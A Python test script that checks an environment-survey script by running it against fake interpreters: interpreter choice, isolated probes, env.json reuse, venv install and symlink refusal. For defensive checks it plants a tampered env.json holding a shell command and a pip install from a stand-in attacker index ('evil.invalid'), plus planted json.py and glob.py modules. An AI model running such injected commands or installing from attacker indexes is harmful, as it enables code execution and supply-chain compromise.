#!/usr/bin/env python3
"""Checks the environment survey the test skills ship, against fake interpreters.

The script integrators copy lives in one place, the python block of
catalogue/shared/concepts/test-environment.md. This takes that block, not a
copy, and runs it with PATH holding fake interpreters, small shell scripts
that answer the survey's probe as a real Python would and log how they were
called, and checks:

- the script parses as Python 3.9, imports nothing outside the standard
  library, calls no shell, and gives every subprocess a timeout;
- it picks the newest 3.9 or later with all four libraries, past a 3.8 that
  has them and past a complete 3.9 found first; with none complete, the newest
  3.9 or later, exiting 1 and naming what is missing;
- every probe runs with -I, or -E -s for an interpreter that refuses -I, from
  a folder that is not the project and is gone afterwards, with no
  PYTHONPATH, PYTHONSTARTUP or PYTHONHOME, even when the survey was started
  with them set;
- a json.py planted in the project and on PYTHONPATH, and a glob.py and a
  json.py planted beside the script, never run, the script started without -I;
- env.json is reused for the same run type and package while its
  interpreter still holds the libraries, probing only that interpreter; a
  different run type, a different package, or a lost library surveys again;
- install without --yes exits 3 and runs nothing; with --yes it creates
  abdm-ft/.venv from a plain interpreter outside the project and runs pip in
  that venv only, with the fixed arguments; a tampered env.json carrying a
  shell command or --index-url changes nothing it runs; an interpreter inside
  the project is never the base; a missing venv python gives a clear message;
- a symlinked abdm-ft or abdm-ft/.venv is refused, and nothing is written
  through it;
- workbook refuses until NHA's workbook, by its shipped name, is a plain file
  in the run folder that opens as a workbook;
- a ui run with no node on PATH lists Node as missing, and env.json names a
  browser with its --browser value or prints npx playwright install chromium.

Usage: python3 scripts/check-test-environment.py [path to an alternative atom]
Exits 0 when every check passes.
"""
import ast
import json
import os
import re
import subprocess
import sys
import tempfile
import zipfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
ATOM = Path(sys.argv[1]) if len(sys.argv) > 1 else ROOT / "catalogue" / "shared" / "concepts" / "test-environment.md"
STDLIB = {"argparse", "glob", "json", "os", "re", "shutil", "subprocess", "sys", "tempfile", "datetime", "zipfile"}
FIXED_PIP = "-I -m pip install --isolated --disable-pip-version-check --no-input openpyxl pillow python-docx"
failures = []


def ok(cond, message):
    if cond:
        print(f"ok   {message}")
    else:
        failures.append(message)
        print(f"FAIL {message}")


def block(path):
    found = re.search(r"```python\n(.*?)\n```", path.read_text(), re.S)
    if not found:
        sys.exit(f"no python block in {path}")
    return found.group(1) + "\n"


# A fake interpreter. It answers the probe with its version and libraries and logs the
# flags, the folder and the Python variables it was started with; it creates a venv
# holding a fake with every library, and logs every other call. Files beside it change
# it: <name>.lost takes its libraries away, <name>.noI makes it refuse -I, and
# <name>.novenvpython makes its venv come out without a python.
FAKE = """#!/bin/sh
if [ "$1" = "-I" ] && [ -f "$0.noI" ]; then echo "Unknown option: -I" >&2; exit 2; fi
FLAGS=""
while [ "$1" = "-I" ] || [ "$1" = "-E" ] || [ "$1" = "-s" ]; do FLAGS="$FLAGS $1"; shift; done
if [ "$1" = "-c" ]; then
  echo "$0 -c <probe> flags=$FLAGS cwd=$PWD pythonpath=${{PYTHONPATH-unset}} startup=${{PYTHONSTARTUP-unset}} home=${{PYTHONHOME-unset}}" >> "{log}"
  if [ -f "$0.lost" ]; then LIBS='{{}}'; else LIBS='{libs}'; fi
  echo '{{"version": "{version}", "prefix": "'"$0"'", "venv": {venv}, "libraries": '"$LIBS"', "errors": {{}}}}'
  exit 0
fi
echo "$0$FLAGS $*" >> "{log}"
if [ "$1" = "-m" ] && [ "$2" = "venv" ]; then
  /bin/mkdir -p "$3/bin"
  if [ ! -f "$0.novenvpython" ]; then
    /bin/cat "{template}" > "$3/bin/python"
    /bin/chmod +x "$3/bin/python"
  fi
  exit 0
fi
if [ "$1" = "-m" ] && [ "$2" = "pip" ]; then
  exit 0
fi
exit 1
"""
ALL = '{"openpyxl": "3.1.5", "PIL": "11.0.0", "docx": "1.2.0", "reportlab": "4.4.0"}'
# A planted module: importing it leaves a mark.
PLANT = "open({mark!r}, 'a').write({name!r} + '\\n')\n"


def fake(path, version, libs, log, template, venv="false"):
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(FAKE.format(log=log, version=version, libs=libs, venv=venv, template=template))
    path.chmod(0o755)
    return path


def main():
    source = block(ATOM)
    tree = ast.parse(source, feature_version=(3, 9))
    imported = {a.name.split(".")[0] for n in ast.walk(tree) if isinstance(n, ast.Import) for a in n.names}
    imported |= {n.module.split(".")[0] for n in ast.walk(tree) if isinstance(n, ast.ImportFrom) and n.module}
    ok(imported <= STDLIB, f"the survey parses as Python 3.9 and imports only the standard library: {sorted(imported - STDLIB)}")
    ok(chr(0x2014) not in source, "the survey holds no em dash")
    calls = [n for n in ast.walk(tree) if isinstance(n, ast.Call) and isinstance(n.func, ast.Attribute)
             and isinstance(n.func.value, ast.Name) and n.func.value.id == "subprocess"]
    untimed = [n.func.attr for n in calls if not any(k.arg == "timeout" for k in n.keywords)]
    shell = [n.func.attr for n in calls if any(k.arg == "shell" for k in n.keywords)] + \
        [n.attr for n in ast.walk(tree) if isinstance(n, ast.Attribute) and n.attr == "system"]
    ok(calls and not untimed and not shell, f"every subprocess call has a timeout and none uses a shell: {untimed + shell}")

    with tempfile.TemporaryDirectory() as tmp:
        work = Path(os.path.realpath(tmp))
        script = work / "abdm_env.py"
        script.write_text(source)
        log = work / "calls.log"
        log.write_text("")
        template = work / "venv-python"
        # What a venv's python is: every library, and it says it is a venv.
        template.write_text(FAKE.format(log=log, version="3.12.1", libs=ALL, venv="true", template=template))
        py39 = fake(work / "a" / "python3.9", "3.9.18", "{}", log, template)
        py38 = fake(work / "c" / "python3.8", "3.8.10", ALL, log, template)
        py312 = fake(work / "b" / "python3.12", "3.12.1", ALL, log, template)
        home = work / "home"
        home.mkdir()

        def survey(project, path, *args, extra=None, isolated=True):
            env = {"PATH": path, "HOME": str(home), "LANG": "C.UTF-8", **(extra or {})}
            flags = ["-I"] if isolated else []
            return subprocess.run([sys.executable, *flags, str(script), *args], cwd=project, env=env,
                                  capture_output=True, text=True, timeout=300)

        def probes():
            return [line for line in log.read_text().splitlines() if " -c <probe> " in line]

        # Three interpreters on PATH: a 3.9 without the libraries, a 3.8 and a 3.12 with them.
        one = work / "one"
        one.mkdir()
        path = os.pathsep.join(str(p.parent) for p in (py39, py38, py312))
        out = survey(one, path, "survey", "--run", "ft", "--search", "venv,path",
                     extra={"PYTHONPATH": str(work / "planted"), "PYTHONSTARTUP": str(work / "startup.py")})
        envfile = one / "abdm-ft" / "env.json"
        env = json.loads(envfile.read_text()) if envfile.exists() else {}
        chosen = env.get("python") or {}
        ok(out.returncode == 0 and chosen.get("path") == str(py312) and "ready" in out.stdout,
           "survey: picks a 3.9 or later with all four libraries, past a 3.8 that has them, and exits 0")
        ok("newest Python 3.9 or later with all four" in env.get("why", "") and f"chosen: {py312}" in out.stdout,
           "survey: says why it chose that interpreter")
        ok(chosen.get("version") == "3.12.1" and set(chosen.get("libraries", {})) == {"openpyxl", "PIL", "docx", "reportlab"}
           and re.match(r"\d{4}-\d{2}-\d{2}T", env.get("written", "")),
           "env.json: holds the interpreter's path, version, the four libraries and a timestamp")
        lines = probes()
        cwds = [re.search(r"cwd=(\S+)", line).group(1) for line in lines]
        ok(lines and all("flags= -I " in line for line in lines), "probe: every interpreter is asked with -I")
        ok(cwds and all(os.path.realpath(c) != str(one) and not os.path.exists(c) and not c.startswith(str(one)) for c in cwds),
           "probe: from a folder of its own, not the project, removed afterwards")
        ok(all("pythonpath=unset startup=unset home=unset" in line for line in lines),
           "probe: no PYTHONPATH, PYTHONSTARTUP or PYTHONHOME reaches it, though the survey was started with them")

        # An interpreter that refuses -I is asked with -E -s.
        old = fake(work / "e" / "python3.10", "3.10.4", "{}", log, template)
        Path(str(old) + ".noI").write_text("")
        log.write_text("")
        out = survey(work / "one", str(old.parent), "survey", "--run", "ft", "--search", "path", "--refresh")
        ok(any(line.startswith(str(old)) and "flags= -E -s " in line for line in probes()) and "3.10.4" in out.stdout,
           "probe: an interpreter that refuses -I is asked with -E -s and still listed")

        # Two complete interpreters, the 3.9 first on PATH: the newer one is chosen.
        py39ok = fake(work / "d" / "python3.9", "3.9.18", ALL, log, template)
        four = work / "four"
        four.mkdir()
        out = survey(four, os.pathsep.join([str(py39ok.parent), str(py312.parent)]), "survey", "--run", "ft", "--search", "venv,path")
        env = json.loads((four / "abdm-ft" / "env.json").read_text())
        ok(out.returncode == 0 and env["python"]["path"] == str(py312),
           "survey: with a complete 3.9 and a complete 3.12, picks the newest, the 3.12, whatever the order")

        # Reuse, and when not to.
        survey(one, path, "survey", "--run", "ft", "--search", "venv,path", "--refresh")
        log.write_text("")
        out = survey(one, path, "survey", "--run", "ft", "--search", "venv,path")
        ok(out.returncode == 0 and out.stdout.startswith("reusing") and probes()
           and all(line.startswith(str(py312) + " ") for line in probes()),
           "env.json reuse: a second survey of the same run type reuses it, probing only the interpreter it names")
        out = survey(one, path, "survey", "--run", "ui", "--search", "venv,path")
        ok(not out.stdout.startswith("reusing"), "env.json reuse: a different run type surveys again")
        survey(one, path, "survey", "--run", "ft", "--search", "venv,path")
        out = survey(one, path, "survey", "--run", "ft", "--phr-package", "in.example.phr", "--search", "venv,path")
        ok(not out.stdout.startswith("reusing"), "env.json reuse: a different PHR package surveys again")
        survey(one, path, "survey", "--run", "ft", "--search", "venv,path", "--refresh")
        Path(str(py312) + ".lost").write_text("")
        out = survey(one, path, "survey", "--run", "ft", "--search", "venv,path")
        ok(not out.stdout.startswith("reusing") and out.returncode == 1,
           "env.json reuse: once that interpreter loses its libraries, the survey runs again and reports what is missing")
        Path(str(py312) + ".lost").unlink()
        survey(one, path, "survey", "--run", "ft", "--search", "venv,path", "--refresh")
        out = survey(one, path, "python")
        ok(out.returncode == 0 and out.stdout.strip() == str(py312), "python: prints the interpreter env.json names")

        # A ready ui survey is never reused for another run type: the ui environment held a browser and Node,
        # and an ft or all run is judged on what it asked for.
        nodebin = work / "nodebin"
        nodebin.mkdir()
        (nodebin / "node").write_text("#!/bin/sh\necho v20.1.0\n")
        (nodebin / "node").chmod(0o755)
        cache = work / "pwcache"
        (cache / "chromium-1148").mkdir(parents=True)
        uipath = os.pathsep.join([str(nodebin), path])
        browser_env = {"PLAYWRIGHT_BROWSERS_PATH": str(cache)}
        first = survey(one, uipath, "survey", "--run", "ui", "--search", "venv,path", "--refresh", extra=browser_env)
        again = survey(one, uipath, "survey", "--run", "ui", "--search", "venv,path", extra=browser_env)
        ok(first.returncode == 0 and again.returncode == 0 and again.stdout.startswith("reusing"),
           "env.json reuse: a ready ui survey is reused for another ui run while Node and the browser answer")
        other = survey(one, uipath, "survey", "--run", "ft", "--search", "venv,path", extra=browser_env)
        ok(not other.stdout.startswith("reusing"), "env.json reuse: an env.json written for a ui run is not reused for an ft run")
        survey(one, uipath, "survey", "--run", "ui", "--search", "venv,path", "--refresh", extra=browser_env)
        saved = json.loads((one / "abdm-ft" / "env.json").read_text())
        saved["browser"] = {"name": "Google Chrome", "path": str(work / "no-such-browser"), "browser_option": "chrome"}
        (one / "abdm-ft" / "env.json").write_text(json.dumps(saved))
        gone = survey(one, uipath, "survey", "--run", "ui", "--search", "venv,path", extra=browser_env)
        ok(not gone.stdout.startswith("reusing"), "env.json reuse: a ui env.json is not reused once its browser no longer answers")
        survey(one, path, "survey", "--run", "ft", "--search", "venv,path", "--refresh")

        # Planted modules never run: the script started without -I runs itself again isolated.
        mark = work / "planted.mark"
        planted = work / "planted"
        planted.mkdir()
        plants = ((planted, "json"), (one, "json"), (work, "glob"), (work, "json"))
        for folder, name in plants:
            (folder / f"{name}.py").write_text(PLANT.format(mark=str(mark), name=f"{folder.name}/{name}"))
        (work / "startup.py").write_text(PLANT.format(mark=str(mark), name="startup"))
        real = work / "r" / "python3.11"
        real.parent.mkdir()
        real.write_text(f'#!/bin/sh\nexec "{sys.executable}" "$@"\n')
        real.chmod(0o755)
        out = survey(one, os.pathsep.join([str(real.parent), str(py312.parent)]), "survey", "--run", "ft",
                     "--search", "venv,path", "--refresh", isolated=False,
                     extra={"PYTHONPATH": str(planted), "PYTHONSTARTUP": str(work / "startup.py")})
        ok(out.returncode in (0, 1) and "chosen:" in out.stdout and not mark.exists(),
           "planted modules: a json.py in the project and on PYTHONPATH, a glob.py and json.py beside the script, "
           f"and a startup file never run: {mark.read_text().split() if mark.exists() else []}")
        for folder, name in plants:
            (folder / f"{name}.py").unlink()

        # Only the 3.9 without the libraries: install.
        two = work / "two"
        two.mkdir()
        only = str(py39.parent)
        out = survey(two, only, "survey", "--run", "ft", "--search", "venv,path")
        env = json.loads((two / "abdm-ft" / "env.json").read_text())
        venv = str(two / "abdm-ft" / ".venv")
        ok(out.returncode == 1 and env["python"]["path"] == str(py39) and "newest 3.9 or later" in env["why"],
           "survey: with no interpreter holding all four, picks the newest 3.9 or later and exits 1")
        ok("missing: python library openpyxl" in out.stdout and "install --yes" in out.stdout and venv in out.stdout,
           "survey: names the missing libraries and the install to offer, into abdm-ft/.venv")

        log.write_text("")
        out = survey(two, only, "install", "--search", "venv,path", "--run", "ft")
        calls = log.read_text()
        ok(out.returncode == 3 and "install --yes" in out.stdout and "-m venv" in out.stdout,
           "install without --yes: exits 3 and prints the exact commands")
        ok("-m venv" not in calls and "-m pip" not in calls and not Path(venv).exists(),
           "install without --yes: runs nothing, creates no venv and calls no pip")

        # A tampered env.json: install builds its own commands and never reads these.
        env["install_steps"] = [["/bin/sh", "-c", f"touch {work / 'PWNED'}"],
                                [venv + "/bin/python", "-m", "pip", "install", "--index-url", "http://evil.invalid/", "evil"]]
        env["install"] = f"/bin/sh -c 'touch {work / 'PWNED'}'"
        (two / "abdm-ft" / "env.json").write_text(json.dumps(env))
        log.write_text("")
        out = survey(two, only, "install", "--yes", "--search", "venv,path", "--run", "ft")
        lines = log.read_text().splitlines()
        venv_calls = [c for c in lines if " -m venv " in c]
        pip_calls = [c for c in lines if " -m pip " in c]
        ok(not (work / "PWNED").exists() and "--index-url" not in log.read_text() and "evil" not in log.read_text(),
           "install --yes: a tampered env.json with a shell command and --index-url changes nothing it runs")
        ok(len(venv_calls) == 1 and venv_calls[0].startswith(str(py39) + " -I -m venv " + venv)
           and len(pip_calls) == 1 and pip_calls[0].startswith(venv + "/bin/python " + FIXED_PIP + " reportlab<5"),
           "install --yes: creates the venv once from the probed base, and runs pip in abdm-ft/.venv only, fixed arguments")
        env = json.loads((two / "abdm-ft" / "env.json").read_text())
        ok(out.returncode == 0 and env["python"]["found_in"] == "abdm-ft/.venv",
           "install --yes: the survey after it picks abdm-ft/.venv")

        # A venv that comes out without a python: a clear message, no crash.
        seven = work / "seven"
        seven.mkdir()
        broken = fake(work / "f" / "python3.11", "3.11.2", "{}", log, template)
        Path(str(broken) + ".novenvpython").write_text("")
        out = survey(seven, str(broken.parent), "install", "--yes", "--search", "venv,path", "--run", "ft")
        ok(out.returncode == 1 and "no such program" in out.stderr and "Traceback" not in out.stderr,
           "install --yes: a missing venv python gives a clear message and exit 1")

        # The only plain interpreter lives in the project: never the base.
        six = work / "six"
        inproject = fake(six / "tools" / "python3.12", "3.12.1", "{}", log, template)
        out = survey(six, str(inproject.parent), "install", "--yes", "--search", "venv,path", "--run", "ft")
        ok(out.returncode == 2 and not (six / "abdm-ft" / ".venv").exists() and "outside the project" in out.stderr,
           "install: an interpreter inside the project is never the base of abdm-ft/.venv")

        # Symlinks are refused.
        five = work / "five"
        (five / "abdm-ft").mkdir(parents=True)
        elsewhere = work / "elsewhere"
        elsewhere.mkdir()
        (five / "abdm-ft" / ".venv").symlink_to(elsewhere)
        out1 = survey(five, only, "survey", "--run", "ft", "--search", "venv,path")
        out2 = survey(five, only, "install", "--yes", "--search", "venv,path", "--run", "ft")
        ok(out1.returncode == 5 and out2.returncode == 5 and "symlink" in out2.stderr and not any(elsewhere.iterdir()),
           "symlink: a symlinked abdm-ft/.venv is refused by survey and install, and nothing is written through it")
        eight = work / "eight"
        eight.mkdir()
        (eight / "abdm-ft").symlink_to(elsewhere)
        out = survey(eight, only, "survey", "--run", "ft", "--search", "venv,path")
        ok(out.returncode == 5 and not any(elsewhere.iterdir()), "symlink: a symlinked abdm-ft is refused")

        # The workbook check.
        skill = work / "skill"
        (skill / "workbook").mkdir(parents=True)
        name = "M1_SAMPLE.xlsx"
        with zipfile.ZipFile(skill / "workbook" / name, "w") as z:
            z.writestr("xl/workbook.xml", "<workbook/>")
        nine = work / "nine"
        (nine / "abdm-ft").mkdir(parents=True)
        out = survey(nine, only, "workbook", "--skill", str(skill))
        ok(out.returncode == 4 and "refused" in out.stderr, "workbook: refused when NHA's workbook is not in abdm-ft")
        (nine / "abdm-ft" / name).write_text("not a workbook")
        out = survey(nine, only, "workbook", "--skill", str(skill))
        ok(out.returncode == 4, "workbook: refused when the file there does not open as a workbook")
        (nine / "abdm-ft" / name).unlink()
        (nine / "abdm-ft" / name).symlink_to(skill / "workbook" / name)
        out = survey(nine, only, "workbook", "--skill", str(skill))
        ok(out.returncode == 4, "workbook: refused when the copy is a symlink")
        (nine / "abdm-ft" / name).unlink()
        (nine / "abdm-ft" / name).write_bytes((skill / "workbook" / name).read_bytes())
        out = survey(nine, only, "workbook", "--skill", str(skill))
        ok(out.returncode == 0 and out.stdout.startswith("workbook: "), "workbook: passes with the copy in abdm-ft")

        # A ui run with no node on PATH.
        three = work / "three"
        three.mkdir()
        out = survey(three, str(py312.parent), "survey", "--run", "ui", "--search", "venv,path")
        env = json.loads((three / "abdm-ft" / "env.json").read_text())
        ok("Node 18 or later" in env.get("missing", []), "ui: no node on PATH is listed as missing")
        browser = env.get("browser")
        ok("browsers" in env and ((browser and browser.get("browser_option") in ("chrome", "msedge", "chromium"))
                                  or (not browser and env.get("browser_install") == "npx playwright install chromium")),
           "ui: env.json names a browser with its --browser value, or the one command to install Chromium")

    if failures:
        print(f"\n{len(failures)} check(s) failed")
        sys.exit(1)
    print("\nThe environment survey passes every check.")


if __name__ == "__main__":
    main()
